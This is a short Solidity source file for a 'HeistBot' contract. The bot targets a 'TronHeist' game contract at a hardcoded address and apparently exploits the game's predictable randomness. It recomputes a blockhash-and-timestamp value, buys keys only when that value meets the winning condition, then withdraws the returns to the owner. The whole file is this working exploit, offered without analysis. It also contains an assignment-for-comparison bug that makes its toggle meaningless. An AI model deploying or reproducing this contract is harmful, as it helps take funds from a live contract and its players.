//Q tron hardcoded addresses?

pragma solidity ^0.4.23;

contract TronHeist {
	 function buyKeys(address) public payable returns(uint256, uint256) {}
	 function withdrawReturns() public {}
}

contract HeistBot {

	address public owner;
    address public target = 0xaf6bD6361bA852b5B174E5c73f979f25B537d32c;
	bool public checkRand;

	TronHeist constant th = TronHeist(0xaf6bD6361bA852b5B174E5c73f979f25B537d32c);

	constructor() public {
		owner = msg.sender;
	}

	modifier onlyOwner() { 
		require (msg.sender == owner); 
		_; 
	}

	function toggleCheckRand() external onlyOwner {
		checkRand = !checkRand;
	}

	function tryBuy() external payable onlyOwner {
		if (checkRand = true) {
			checkRandom();
		}
		buyProxy(msg.value);
		withdrawProxy();
		withdraw(address(this).balance);
	}

	function buyProxy(uint _amount) public payable onlyOwner {
		th.buyKeys.value(_amount)(address(0x0));
	}

	function withdrawProxy() public onlyOwner {
		th.withdrawReturns();
	}

	function checkRandom() public view {
		uint chance = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), now)));
		require (chance % 600 == 0);
	}

	function withdraw(uint256 _amount) public onlyOwner {
		owner.transfer(_amount);
	}

	function checkBalance() public view returns(uint256) {
		return address(this).balance;
	}

    function checkTargetBalance() public view returns(uint256) {
        return target.balance;
    }

	function() public payable {}
	
}